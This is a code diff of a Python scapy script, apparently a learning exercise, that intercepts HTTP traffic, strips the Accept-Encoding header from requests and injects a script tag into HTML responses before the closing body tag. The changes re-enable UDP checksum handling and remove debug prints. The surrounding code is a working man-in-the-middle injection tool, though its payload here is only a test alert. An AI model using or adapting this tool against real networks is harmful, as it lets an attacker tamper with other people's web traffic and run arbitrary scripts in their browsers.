@@ -15,9 +15,9 @@ def set_load(packet, load):
     del packet[IP].len
     del packet[IP].chksum
     del packet[TCP].chksum
-    # if packet.haslayer(UDP):
-    #     del packet[UDP].len
-    #     del packet[UDP].chksum
+    if packet.haslayer(UDP):
+        del packet[UDP].len
+        del packet[UDP].chksum
     return packet
 
 def process_packet(packet):
@@ -27,11 +27,8 @@ def process_packet(packet):
             # print("\n[+] Packet has layer TCP")
             if scapy_packet[TCP].dport == 80:
                 print("[+] This is a HTTP Request:  ")
+                # 
                 # Find "Accept-Encoding" in payload, replace with ""
-                # print("[+] Current IP and TCP values: ")
-                # print(scapy_packet[IP].len)
-                # print(scapy_packet[IP].chksum)
-                # print(scapy_packet[TCP].chksum)
                 modified_load = re.sub(
                     "Accept-Encoding:.*?\\r\\n",
                     "",
@@ -40,17 +37,11 @@ def process_packet(packet):
                 )
                 # Create a new packet
                 new_packet = set_load(scapy_packet, modified_load)
-                # print("[+] New IP and TCP Layer len and chksum: ")
-                # print(new_packet[IP].len)
-                # print(new_packet[IP].chksum)
-                # print(new_packet[TCP].chksum)
                 # set the new packet with the updated payload to the actual packet
                 packet.set_payload(str(new_packet))
                 # After testing the above, we should get nothing but clean HTML page markup
                 # in the payload.
             elif scapy_packet[TCP].sport == 80:
-                # print("[+] This is a HTTP Response: ")
-                # print(scapy_packet[Raw].load)
                 # invoke python method replace to replace a string with another string
                 modified_load = scapy_packet[Raw].load.replace("</body>", "<script>alert('Test!'); </script></body>")
                 new_packet = set_load(scapy_packet, modified_load)
